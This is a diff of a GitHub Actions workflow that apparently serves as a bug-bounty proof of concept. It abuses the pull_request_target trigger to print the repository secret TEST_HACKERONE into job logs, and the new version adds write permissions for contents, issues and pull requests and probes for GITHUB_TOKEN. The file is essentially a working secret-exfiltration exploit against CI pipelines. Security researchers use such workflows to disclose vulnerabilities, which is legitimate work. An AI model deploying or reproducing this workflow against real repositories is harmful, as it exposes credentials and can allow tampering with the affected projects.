@@ -1,19 +1,24 @@
-name: Proof of Concept
-on:
-  pull_request_target:
-    branches: [ main ]
+name: Test with Write Permissions
+on: pull_request_target
+
+# Try with write permissions
+permissions:
+  contents: write
+  issues: write
+  pull-requests: write
 
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Prove vulnerability
+      - name: Checkout
+        uses: actions/checkout@v3
+      
+      - name: Test secret access with write perms
         run: |
-          echo "=== PROOF OF VULNERABILITY ==="
+          echo "Testing with write permissions..."
           echo "Repository: ${{ github.repository }}"
           echo "Event: ${{ github.event_name }}"
           echo ""
-          echo "SECRET TEST_HACKERONE:"
-          echo "${{ secrets.TEST_HACKERONE }}"
-          echo ""
-          echo "If you see a secret value above, vulnerability is confirmed."
+          echo "TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}"
+          echo "GITHUB_TOKEN exists: ${{ secrets.GITHUB_TOKEN != '' }}"
